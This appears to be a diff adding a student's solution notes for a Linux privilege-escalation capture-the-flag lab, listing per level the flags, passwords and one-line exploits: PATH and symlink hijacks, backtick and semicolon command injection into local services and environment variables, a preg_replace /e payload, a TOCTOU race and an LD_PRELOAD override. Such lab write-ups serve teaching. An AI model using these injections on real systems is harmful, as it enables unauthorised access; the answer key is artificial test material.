@@ -2,3 +2,22 @@ level00 ls -lR / | grep flag00 => create .c to check code +n =>  nottoohardhere 
 level01 /etc/passwd, flag01 => john the ripper =>  abcdefg	flag=f2av5il02puano7naaf6adaaf
 level02 "scp -P 4242 level02@10.11.200.229:level02.pcap ." -> pcap => cloudshark => ft_wandr del del del NDRel del L0L => ft_waNDReL0L flag=kooda2puivaav1idi4f57q8iq
 level03 cd /tmp => ln -s /bin/getflag echo + export PATH=/tmp:$PATH => ./level03 => flag=qi0maab88jeaj46qoumi7maus
+level04 curl localhost:4747?x=\`getflag\` => flag=ne2searoevaevoem4ov4ar8ap
+level05 echo "getflag > /tmp/mdp" wait for the script to be executed by flag05 every 2 min get flag in /tmp/mdp	=> flag=viuaaale9huek52boumoomioc
+level06 exploit binary suid preg_replace /e (deprecated) the /e will execute the second argument of the preg_replace function as a php expression. "echo '[x {${system(getflag)}}]' > /tmp/gf" ./level06 /tmp/gf => flag=wiok45aaoguiboiki2tuin6ub
+level07 gdb => getenv looking for LOGNAME => export LOGNAME='hello;getflag' => ./level07 => flag=fiumuikeil55xe9cu4dood66h
+level08	can't read token because binary refuse any file with "token" in the path or name => create a symbolic link of token => ln -s ~/token /tmp/toto => ~/level08 /tmp/toto => password=quif5eloekouj29ke0vouxean => flag=25749xKZ8L7DkSCwJkT9dyv6f
+level09 binary level09 take as argument a string and crypt it, it add to the char it position (e.g. 123456 => 13579), create a prog.c to decrypt it. mdp=f3iji1ju5yuevaus41q1afiuq => flag=s5cAJpM8ev6XHw998pRWG728z
+level10 binary using access to check if real uid can read file and then use open which use effective uid, ruid level10 cant read flag10, euid can. Using delay between the two function to change the path of the argument to bypass the access check. using infinite loop which interverte symbolic link between accessible file and toke nfile. i can then launch level10 binary while listen with a server on 6969, try to launch multiple time to get the good timing when acces check the readable file and then open try to open token file ->  mdp=woupa2yuojeeaaed06riuj63c => flag=feulo4b72j7edeahuete3no7c
+level11 level11.lua show that there is a server running on 5151. using popen to execute a ccommand system to hash the password, injecting "passwd; getflag > /tmp/flag" => flag=fa6v5ateaw21peobuub8ipe6s
+level12 create a script in /tmp/FLAG.SH
+#!/bin/bash
+getflag > /tmp/test/f12
+curl localhost:4646?x="\`/*/flag.sh\`"
+flag=g1qKMiRpXf53AWhDaU7FEkczr
+level13 function injection because binary dosnt need anything to work expect the good guid. Create fake guid function and
+copy level13 binary
+gcc -shared -fPIC -o getuid.so getuid.c
+LD_PRELOAD=./getuid.so ./level13
+flag=2A31L79asukciNyi8uppkEuSx
+level14
